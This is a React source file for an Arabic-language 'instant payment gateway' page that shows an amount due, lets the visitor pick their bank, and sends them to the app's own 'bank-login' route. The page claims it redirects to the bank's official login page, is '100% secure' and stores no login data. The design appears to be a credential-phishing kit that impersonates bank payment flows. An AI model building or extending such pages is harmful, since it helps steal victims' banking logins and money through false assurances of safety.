import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Landmark, ShieldCheck, Building2, Search, ChevronLeft, Globe, Lock } from "lucide-react";
import { getBanksByCountry } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { Input } from "@/components/ui/input";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  const [searchTerm, setSearchTerm] = useState("");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(selectedCountry);
  const banks = getBanksByCountry(selectedCountry);
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const filteredBanks = banks.filter(bank => {
    const nameMatch = bank.name ? bank.name.toLowerCase().includes(searchTerm.toLowerCase()) : false;
    const nameArMatch = bank.nameAr ? bank.nameAr.includes(searchTerm) : false;
    return nameMatch || nameArMatch;
  });

  const handleBankSelect = async (bankId: string) => {
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: { ...linkData?.payload, selectedBank: bankId }
        });
      }
      const query = new URLSearchParams(window.location.search);
      query.set('bank', bankId);
      navigate(`/pay/${id}/bank-login?${query.toString()}`);
    } catch (error) {
      console.error("Error updating bank selection:", error);
    }
  };

  if (isLoading || !linkData) return (
    <div className="min-h-screen flex items-center justify-center bg-white">
      <div className="flex flex-col items-center gap-4">
        <div className="animate-spin rounded-full h-12 w-12 border-4 border-slate-100 border-t-primary"></div>
        <p className="text-sm font-bold text-slate-400 animate-pulse">جاري التحميل...</p>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#F8FAFC] flex flex-col font-arabic select-none" dir="rtl">
      <PaymentMetaTags serviceName="اختيار البنك" title="اختر البنك الخاص بك" />

      {/* Modern Slim Header */}
      <header className="bg-white/80 backdrop-blur-md border-b sticky top-0 z-50 px-4 h-16 sm:h-20 flex items-center">
        <div className="container mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-slate-900 rounded-xl flex items-center justify-center text-white shadow-lg shadow-slate-200">
              <Building2 className="w-5 h-5" />
            </div>
            <div>
              <h1 className="text-sm sm:text-base font-black text-slate-900 leading-none">بوابة التحويل الفوري</h1>
              <p className="text-[8px] sm:text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-1">Instant Payment Gateway</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
             <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-slate-100 text-[10px] font-bold text-slate-600">
                <Globe className="w-3 h-3" />
                <span>English</span>
             </div>
             <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-bold">
                <Lock className="w-3 h-3" />
                <span>آمن 100%</span>
             </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto max-w-6xl px-4 py-6 sm:py-12">
        <div className="flex flex-col lg:flex-row gap-8 lg:gap-12">

           {/* Sidebar: Info & Search */}
           <div className="lg:w-1/3 space-y-6 sm:space-y-8">
              <div className="space-y-3">
                 <h2 className="text-2xl sm:text-4xl font-black text-slate-900 tracking-tight leading-tight">اختر البنك <br className="hidden lg:block" /> لإتمام الدفع</h2>
                 <p className="text-xs sm:text-sm font-bold text-slate-500 leading-relaxed">
                    يرجى تحديد البنك الذي تملك فيه حساباً نشطاً ليتم توجيهك بأمان إلى صفحة تسجيل الدخول الرسمية.
                 </p>
              </div>

              {/* Amount Display Card */}
              <div className="p-6 sm:p-8 rounded-[2rem] text-white shadow-2xl relative overflow-hidden bg-slate-900 group">
                 <div className="relative z-10">
                    <p className="text-[9px] font-black text-slate-400 uppercase tracking-[0.2em] mb-2 opacity-80">إجمالي المبلغ المستحق</p>
                    <div className="flex items-baseline gap-2 mb-6">
                       <span className="text-3xl sm:text-5xl font-black tracking-tighter">{formattedAmount}</span>
                    </div>
                    <div className="flex items-center gap-2 text-[9px] font-black text-green-400 bg-green-400/10 px-3 py-2 rounded-xl border border-green-400/20 w-fit">
                       <ShieldCheck className="w-3.5 h-3.5" />
                       <span>معالجة مشفرة ومؤمنة بالكامل</span>
                    </div>
                 </div>
                 <Landmark className="absolute -bottom-6 -right-6 w-32 h-32 opacity-10 -rotate-12 group-hover:rotate-0 transition-transform duration-700" />
                 <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 blur-3xl"></div>
              </div>

              {/* Search Box */}
              <div className="relative group">
                <Input
                  type="text"
                  placeholder="ابحث عن اسم البنك..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="h-14 sm:h-16 pr-14 rounded-2xl border-none ring-1 ring-slate-200 focus:ring-2 focus:ring-primary bg-white transition-all font-bold text-base sm:text-lg shadow-sm"
                />
                <Search className="absolute right-5 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400 group-focus-within:text-primary transition-colors" />
              </div>
           </div>

           {/* Bank Grid Area */}
           <div className="lg:w-2/3">
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-5">
                {filteredBanks.map((bank) => (
                  <button
                    key={bank.id}
                    onClick={() => handleBankSelect(bank.id)}
                    className="group relative bg-white p-5 sm:p-6 rounded-[2rem] border border-slate-100 hover:border-transparent hover:shadow-[0_20px_50px_-12px_rgba(0,0,0,0.1)] transition-all duration-300 flex flex-col items-center gap-4 text-center active:scale-[0.97]"
                  >
                    {/* Brand Color Accent */}
                    <div
                      className="absolute top-0 left-0 right-0 h-1.5 rounded-t-[2rem] opacity-0 group-hover:opacity-100 transition-opacity"
                      style={{ backgroundColor: bank.color }}
                    />

                    <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl bg-slate-50 p-3 sm:p-4 flex items-center justify-center group-hover:bg-white group-hover:shadow-inner transition-all duration-300">
                      <img src={bank.logo} alt={bank.name} className="max-w-full max-h-full object-contain filter group-hover:scale-110 transition-transform duration-500" />
                    </div>

                    <div className="space-y-0.5">
                      <h3 className="text-xs sm:text-sm font-black text-slate-900 group-hover:text-primary transition-colors line-clamp-1">{bank.nameAr}</h3>
                      <p className="text-[8px] sm:text-[9px] font-bold text-slate-400 uppercase tracking-tighter opacity-70">{bank.name}</p>
                    </div>

                    <div className="w-full py-2.5 rounded-xl bg-slate-50 group-hover:bg-slate-900 group-hover:text-white flex items-center justify-center gap-2 text-[9px] font-black transition-all border border-slate-100 group-hover:border-slate-900">
                      <span>اختيار البنك</span>
                      <ChevronLeft className="w-3 h-3 group-hover:-translate-x-1 transition-transform" />
                    </div>
                  </button>
                ))}
              </div>

              {filteredBanks.length === 0 && (
                <div className="py-20 text-center rounded-[2.5rem] bg-white border border-slate-100 shadow-sm px-6">
                  <div className="w-20 h-20 bg-slate-50 rounded-full flex items-center justify-center mx-auto mb-6 text-slate-300">
                    <Building2 className="w-10 h-10" />
                  </div>
                  <h3 className="text-xl font-black text-slate-900 mb-2">عذراً، لم نجد نتائج لـ "{searchTerm}"</h3>
                  <p className="text-slate-400 font-bold text-[10px] uppercase tracking-widest">Please try searching with a different name</p>
                </div>
              )}
           </div>
        </div>
      </main>

      {/* Security Footer */}
      <footer className="py-8 bg-white border-t mt-12">
        <div className="container mx-auto px-4">
          <div className="flex flex-col items-center gap-6">
            <div className="flex items-center justify-center gap-8 opacity-40 grayscale hover:grayscale-0 transition-all duration-500 h-5 sm:h-6">
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" alt="Mada" className="h-full" />
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" alt="Visa" className="h-full" />
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" alt="Mastercard" className="h-full" />
            </div>
            <div className="flex flex-col items-center gap-2">
               <div className="flex items-center gap-2 text-primary font-black text-[10px]">
                  <ShieldCheck className="w-4 h-4" />
                  <span className="uppercase tracking-[0.2em]">End-to-End Encrypted Session</span>
               </div>
               <p className="text-[9px] font-bold text-slate-400 text-center max-w-xs">
                  نحن نستخدم أعلى معايير الأمان العالمية لحماية بياناتك المصرفية. لن يتم تخزين أي من بيانات الدخول الخاصة بك.
               </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PaymentBankSelector;
